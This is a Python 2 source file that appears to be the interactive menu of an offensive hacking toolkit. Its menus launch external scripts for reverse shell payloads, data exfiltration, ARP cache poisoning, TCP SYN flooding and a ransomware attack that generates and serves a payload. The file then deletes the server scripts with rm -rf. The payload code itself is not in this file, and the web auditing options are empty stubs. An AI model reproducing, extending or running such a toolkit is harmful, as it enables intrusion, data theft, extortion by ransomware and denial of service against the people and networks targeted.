import signal, psutil
import sys
import time
from subprocess import Popen, call, PIPE
import os
import socket
import datetime

os.system('/sbin/ifconfig virbr0 down; clear')
date = Popen('date +"%m-%d-%y"', shell = True, stdout = PIPE).stdout.read().split('\n')[0]

os.system('clear')
battery = psutil.sensors_battery()
plugged = battery.power_plugged
percent = battery.percent
if plugged==False:
    plugged="\033[91m Not Plugged In\033[0;0m"
else:
    plugged="\033[92m Plugged In\033[0;0m"

clock = u'\u23F0'
battery = u'\U0001F50B'
plugin = u'\U0001F50C'

def main_window():

    sys.stdout.write("\033[1m\033[36m\n\n\n\t    MAIN MENU\033[0;0m")
    sys.stdout.write("\033[1m\033[94m\t\t\t\t\t\t\t\t\t       Internet Connection Status      :  \033[0;0m ")
    sys.stdout.flush()
    try:
        if socket.gethostbyname('www.google.com'):
            sys.stdout.write('\033[92m\033[1mCONNECTED\n\n\033[0;0m')
    except:
        sys.stdout.write('\033[1m\033[91mNOT CONNECTED\n\n\033[0;0m')
        print "\t    Check Internet Connection!\n"
        try:
            i = input("\t    Press ENTER To EXIT...")
        except:
	    os.system('clear; xdotool key F11')
            os.kill(os.getpid(), signal.SIGKILL)
    	   
    sys.stdout.write("\t    \033[1m\033[95mEnter Choice:\033[0;0m                                                                      "+clock.encode("UTF-8"))
    sys.stdout.write("\033[1m  "+str(time.ctime())+'\033[0;0m  '+battery.encode("UTF-8")+'  '+str(int(percent))+'% |'+str(plugged)+' '+plugin.encode("UTF-8"))
    sys.stdout.write("\n\n\t    1) Information Gathering >\t\t\t\t\t\t\t     \033[1m  Commands\033[0;0m :: [\033[91mCase Senstive\033[0;0m]\n")
    sys.stdout.write("\t    2) Reverse Shell >\n")
    sys.stdout.write("\t    3) Exploits >\t\t\t\t\t\t\t\t       Type '\033[93mterm\033[0;0m' For Terminal\n")
    sys.stdout.write("\t    4) Web Auditing >                                                                  Press \033[93m[ctrl]\033[0;0m+\033[93m[super]\033[0;0m+\033[93m[down]\033[0;0m To Minimize\n")
    sys.stdout.write("            5) Ransomware Attack\n            6)\033[91m EXIT\033[0;0m")
   
    try:
        inp = raw_input("\n\n            \033[1mChoice> \033[0;0m")
    
        if inp == '1':
            os.system('clear')
            information_gathering()

        elif inp == '2':
            os.system('clear')
            reverse_shell()
    
        elif inp == '3':
            os.system('clear')
            exploits()
                                            
        elif inp == '4':
            os.system('clear')
            web_auditing()
                                                            
        elif inp =='5':
            os.system('clear')
            print ('\n\n\n\t   \033[36m RANSOMWARE ATTACK\0330;0m\n')
            os.system('python main/payload/ransom_payload.py')
            print "\n            [+] Payload Generated And Uploaded"
            time.sleep(1)
            os.system('python main/host/ransom_server.py')
            try:
                i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
            except:
                os.system('rm -rf main/host/ransom_server.py')
                os.system('clear')
                main_window()

    
        elif inp == '6':
	    print "\n\033[91m\t    EXITING\033[0;0m Back To Shell...\n"
            time.sleep(2)
            os.system('clear; xdotool key F11')
            os.kill(os.getpid(), signal.SIGKILL)
        
	elif inp == 'term':
            os.system('python main/shell.py')
            os.system('python main/MainWindow.py')

        else:
            os.system('clear')
            sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
            main_window()
    
    except (ValueError, SyntaxError, Exception):
        os.system('clear')
        sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
        main_window()

def information_gathering():        
    
    sys.stdout.write("\033[1m\033[36m\n\n\n            INFORMATION GATHERING\033[0;0m")
    sys.stdout.write("\033[1m\033[94m                                                              Internet Connection Status      :  \033[0;0m ")
    sys.stdout.flush()
    try:
        if socket.gethostbyname('www.google.com'):
            sys.stdout.write('\033[92m\033[1mCONNECTED\n\033[0;0m\n')
    except:
        sys.stdout.write('\033[1m\033[91mNOT CONNECTED\n\033[0;0m\n')
    
    sys.stdout.write("            \033[1m\033[95mEnter Choice:\033[0;0m                                                                      "+clock.encode("UTF-8"))
    sys.stdout.write("\033[1m  "+str(time.ctime())+'\033[0;0m  '+battery.encode("UTF-8")+'  '+str(int(percent))+'% |'+str(plugged)+' '+plugin.encode("UTF-8"))

    sys.stdout.write("\n\n            1) Network Scanner                                                               \033[1m  Commands\033[0;0m :: [\033[91mCase Senstive\033[0;0m]\n")
    sys.stdout.write("            2) Port Scanner")
    sys.stdout.write("\n            3) IP/Host Grabber                                                                 Type '\033[93mterm\033[0;0m' For Terminal\n")
    sys.stdout.write("            4) Banner Grabber                                                                  Press \033[93m[ctrl]\033[0;0m+\033[93m[super]\033[0;0m+\033[93m[down]\033[0;0m To Minimize\n")
    sys.stdout.write("            5)\033[0;0m\033[1m\033[91m EXIT\033[0;0m\t\t\t\t\t\t\t\t\t       Type '\033[93mback\033[0;0m' To Go Back\n")
    
    inp_info = raw_input("\n            Choice> ")

    if inp_info == 'back':
        os.system('clear')
        main_window()
    
    elif inp_info == '1':
        os.system('clear')
        os.system('python main/Network_Scanner.py')
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('clear')
            main_window()
        
    elif inp_info == '2':
        os.system('clear')
        os.system('python main/Multithreaded_Portscanner.py')
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu"))
        except:
            os.system('clear')
            main_window()
 
    elif inp_info == '3':
        os.system('python main/Host_Grabber.py')
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('clear')
            main_window()
    
    elif inp_info == '4':
        os.system('python main/Banner_Grabber.py')
        
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('clear')
            main_window()

    
    elif inp_info == '5':
        print "\n\033[91m            EXITING\033[0;0m Back To Shell...\n"
        time.sleep(2)
        os.system('clear')
        os.kill(os.getpid(), signal.SIGKILL)
    
    else:
        os.system('clear')
        sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
        information_gathering()

def reverse_shell():

    sys.stdout.write("\033[1m\033[36m\n\n\n            REVERSE SHELL        \033[0;0m")
    sys.stdout.write("\033[1m\033[94m                                                              Internet Connection Status      :  \033[0;0m ")
    sys.stdout.flush()
    try:
        if socket.gethostbyname('www.google.com'):
            sys.stdout.write('\033[92m\033[1mCONNECTED\n\033[0;0m\n')
    except:
        sys.stdout.write('\033[1m\033[91mNOT CONNECTED\n\033[0;0m\n')
        
    sys.stdout.write("            \033[1m\033[95mEnter Choice:\033[0;0m                                                                      "+clock.encode("UTF-8"))
    sys.stdout.write("\033[1m  "+str(time.ctime())+'\033[0;0m  '+battery.encode("UTF-8")+'  '+str(int(percent))+'% |'+str(plugged)+' '+plugin.encode("UTF-8"))

    sys.stdout.write("\n\n            1) Reverse Shell Connection                                                       \033[1m Commands\033[0;0m :: [\033[91mCase Senstive\033[0;0m]\n")
    sys.stdout.write("            2) Data Exfilteration\n            3) Chat System                                                                     Type '\033[93mterm\033[0;0m' For Terminal\n")
    sys.stdout.write("            4)\033[0;0m\033[1m\033[91m EXIT\033[0;0m                                                                            Press \033[93m[ctrl]\033[0;0m+\033[93m[super]\033[0;0m+\033[93m[down]\033[0;0m To Minimize\n")

    inp_reverse = raw_input("\n            Choice> ")

    if inp_reverse == '1':
        os.system('python main/payload/reverse_shellpayload.py')
        print "\n            [+] Payload Generated And Uploaded"
        time.sleep(1)
        os.system('python main/host/reverse_servershell.py')
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('rm -rf main/host/reverse_servershell.py')
            os.system('clear')
            main_window()

    
    elif inp_reverse == '2':
        os.system('python main/payload/reverse_payload.py')
        print "\n            [+] Payload Generated And Uploaded"
        time.sleep(1)
        os.system('python main/host/reverse_server.py')
        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('rm -rf main/host/reverse_server.py')
            os.system('clear')
            main_window()


    elif inp_reverse == '3':
        os.system('python main/payload/chat_payload.py')
        print "\n            [+] Payload Generated And Uploaded"
        os.system('python main/host/server_chatsystem.py')

        try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('rm -rf main/host/server_chatsystem.py  ;clear')
            main_window()
                                                                    
    elif inp_reverse == '4':
        print "\n\033[91m            EXITING\033[0;0m Back To Shell...\n"
        time.sleep(2)
        os.system('clear')
        os.kill(os.getpid(), signal.SIGKILL)
        
    elif inp_reverse == 'back':
        os.system('clear')
        main_window()

    else:
        os.system('clear')
        sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
        reverse_shell()


def exploits():
    
    sys.stdout.write("\033[1m\033[36m\n\n\n            EXPLOITS             \033[0;0m")
    sys.stdout.write("\033[1m\033[94m                                                              Internet Connection Status      :  \033[0;0m ")
    sys.stdout.flush()
    try:
        if socket.gethostbyname('www.google.com'):
            sys.stdout.write('\033[92m\033[1mCONNECTED\n\033[0;0m\n')
    except:
        sys.stdout.write('\033[1m\033[91mNOT CONNECTED\n\033[0;0m\n')
    
    sys.stdout.write("            \033[1m\033[95mEnter Choice:\033[0;0m                                                                      "+clock.encode("UTF-8"))
    sys.stdout.write("\033[1m  "+str(time.ctime())+'\033[0;0m  '+battery.encode("UTF-8")+'  '+str(int(percent))+'% |'+str(plugged)+' '+plugin.encode("UTF-8"))

    sys.stdout.write("\n\n            1) ARP-Cache Poisoning                                                           \033[1m  Commands\033[0;0m :: [\033[91mCase Senstive\033[0;0m]\n")
    sys.stdout.write("            2) TCP SYN Flood\n            3)\033[0;0m\033[1m\033[91m EXIT\033[0;0m                                                                            Type '\033[93mterm\033[0;0m' For Terminal\n")
    
    sys.stdout.write("                                                                                               Press \033[93m[ctrl]\033[0;0m+\033[93m[super]\033[0;0m+\033[93m[down]\033[0;0m To Minimize")
    
    inp_exploits = raw_input("\n            Choice> ")
    
    if inp_exploits == '1':
        os.system('python main/arppoison.py')
	try:
            i = int(input("\n            Press 'ENTER' To Get Back To Main Menu\n"))
        except:
            os.system('clear')
            main_window()


    elif inp_exploits == '2':
        os.system('python main/tcp-syn-flood.py')
    
    elif inp_exploits == 'back':
        os.system('clear')
        main_window()

    elif inp_exploits == '3':
        print "\n\033[91m            EXITING\033[0;0m Back To Shell...\n"
        time.sleep(2)
        os.system('clear')
        os.kill(os.getpid(), signal.SIGKILL)

    else:
        os.system('clear')
        sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
        exploits()


def web_auditing():
    
    sys.stdout.write("\033[1m\033[36m\n\n\n            WEB AUDITING        \033[0;0m")
    sys.stdout.write("\033[1m\033[94m                                                               Internet Connection Status      :  \033[0;0m ")
    sys.stdout.flush()
    try:
        if socket.gethostbyname('www.google.com'):
            sys.stdout.write('\033[92m\033[1mCONNECTED\n\033[0;0m\n')
    except:
        sys.stdout.write('\033[1m\033[91mNOT CONNECTED\n\033[0;0m\n')

    sys.stdout.write("            \033[1m\033[95mEnter Choice:\033[0;0m                                                                      "+clock.encode("UTF-8"))
    sys.stdout.write("\033[1m  "+str(time.ctime())+'\033[0;0m  '+battery.encode("UTF-8")+'  '+str(int(percent))+'% |'+str(plugged)+' '+plugin.encode("UTF-8"))

    sys.stdout.write("\n\n            1) SQL Injection                                                               \033[1m    Commands\033[0;0m :: [\033[91mCase Senstive\033[0;0m]\n")
    sys.stdout.write("            2) Vulnerability Scanner\n            3) Header Grabber                                                                  Type '\033[93mterm\033[0;0m' For Terminal\n")
    sys.stdout.write("            4)\033[0;0m\033[1m\033[91m EXIT\033[0;0m                                                                            Press \033[93m[ctrl]\033[0;0m+\033[93m[super]\033[0;0m+\033[93m[down]\033[0;0m To Minimize\n")

    inp_web_audit = raw_input("\n            Choice> ")

    if inp_web_audit == '1':
        print 'injection'
                        
    elif inp_web_audit == 'back':
        os.system('clear')
        main_window()
                      
    elif inp_web_audit == '2':
        print "vulner"

    elif inp_web_audit == '3':
        print "header"
    
    elif inp_web_audit == '4':
        print "\n\033[91m            EXITING\033[0;0m Back To Shell...\n"
        time.sleep(2)
        os.system('clear')
        os.kill(os.getpid(), signal.SIGKILL)

    else:
        os.system('clear')
        sys.stdout.write("\n\n\033[91m            INVALID\033[0;0m Input! Please Try Again!")
        web_auditing()

main_window()
